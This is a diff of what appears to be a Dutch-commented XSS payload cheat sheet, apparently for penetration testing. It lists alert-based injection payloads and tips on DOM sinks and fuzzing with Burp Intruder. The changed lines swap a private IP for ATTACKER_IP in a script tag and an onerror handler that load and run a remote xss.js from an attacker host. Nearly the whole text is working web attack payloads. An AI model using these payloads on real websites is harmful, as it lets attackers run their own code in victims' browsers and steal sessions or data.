@@ -25,8 +25,8 @@ javascript:alert(1)
 <img src=x onerror=alert`1`>
 <img src=x onerror="window.onerror=alert;throw 1">
 # === Extern script laden ===
-<script src="http://10.0.0.1/xss.js"></script>
-<img src=x onerror="s=document.createElement('script');s.src='http://10.0.0.1/xss.js';document.body.appendChild(s)">
+<script src="http://ATTACKER_IP/xss.js"></script>
+<img src=x onerror="s=document.createElement('script');s.src='http://ATTACKER_IP/xss.js';document.body.appendChild(s)">
 # === DOM-based (sink: document.write, innerHTML, eval) ===
 # Test: Zet # of ? parameter met payload en check of het in DOM terechtkomt
 # Tip: Gebruik Burp Intruder met XSS polyglot wordlist voor fuzzing
